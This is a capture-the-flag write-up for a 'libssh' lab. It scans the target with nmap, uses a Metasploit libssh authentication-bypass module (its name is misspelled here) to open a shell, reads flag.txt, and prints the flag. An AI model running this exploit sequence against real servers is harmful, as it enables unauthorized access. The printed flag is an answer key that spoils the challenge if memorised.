## libssh

Start by running `nmap` to check open ports.

```sudo nmap <ip> -Pn```

port 22/tcp is open.

```nmap -sS -sV -p22 <ip>```

The service running on this port is SSH. Even though it says OpenSSH, the lab is called libssh, so let's stick with that. Let's run the Metasploit framework and search for libssh modules.

```
msfconsole -q
search libssh
```

We see `libssh_auth_pybass` module, let's use that and set our options.

```
use 0
show options
set SPAWN_PTY true
set RHOSTS <url>
exploit
```
After that is done, a session should be created. Check by running `sessions`. Once we receive the standard shell, upgrade it to the meterpreter session:

```sessions -u 1```

If upgrade is successful, good, if not, use the first session and hope for the best

```sessions -i 1```

Once we get the shell, we can mess around with it to discover the flag file. What works in this case:

```
ls -l
cd ../
ls -l
cat flag.txt
```

_CTF{754a4874399c6c15f6f12d31bccb438d1d42b540e5cec9c2371a831bb1eabeed}_